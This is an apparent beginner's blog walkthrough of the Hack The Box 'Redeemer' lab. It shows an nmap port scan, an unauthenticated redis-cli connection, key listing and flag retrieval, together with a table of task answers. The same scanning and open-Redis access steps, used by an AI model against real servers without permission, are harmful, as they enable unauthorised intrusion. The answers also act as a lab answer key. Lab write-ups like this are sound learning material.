# 🔓 Redeemer | Hack The Box

Note: I’m not an expert. I’m writing this blog just to document my learning journey. 🚀

---

## 🌐 Step 1: Connect to the HTB Network

Start by connecting to the Hack The Box VPN using the `htb.ovpn` file:

```bash
openvpn htb.ovpn
```

Wait for the message:

```
Initialization Sequence Completed
```

Once you're connected, spawn the target machine. My target machine IP was:

```
10.129.250.87
```

---

## 🔍 Step 2: Scan the Target

Run a full TCP port scan to identify open ports:

```bash
nmap -p- 10.129.250.87
```

### 📄 Nmap Output (Shortened):

```
PORT      STATE    SERVICE
6286/tcp  filtered unknown
6379/tcp  open     redis
14614/tcp filtered unknown
15032/tcp filtered unknown
19797/tcp filtered unknown
35460/tcp filtered unknown
51988/tcp filtered unknown
58252/tcp filtered unknown
```

Port `6379` is open and running **Redis**.

---

## 💾 Step 3: Connect to Redis

Use the `redis-cli` utility to connect:

```bash
redis-cli -h 10.129.250.87
```

Once connected, get detailed server info:

```bash
info
```

### 🔢 Redis Version:

```
redis_version:5.0.7
```

---

## 🔑 Step 4: Explore the Database

Check the number of keys:

```bash
keys *
```

### 🗝️ Output:

```
1) "flag"
2) "temp"
3) "stor"
4) "numb"
```

Retrieve the value of the flag:

```bash
get flag
```

🎉 **Flag:**

```
<FLAG REDACTED>
```

---

## ✅ Summary

| Task           | Answer               |
| -------------- | -------------------- |
| Open port      | `6379`               |
| Service        | `redis`              |
| DB type        | `In-memory Database` |
| CLI tool       | `redis-cli`          |
| Host flag      | `-h`                 |
| Info command   | `info`               |
| Version        | `5.0.7`              |
| Select DB      | `select`             |
| Number of keys | `4`                  |
| View keys      | `keys *`             |
| 🎯 Flag        | `<FLAG REDACTED>`    |

---

---
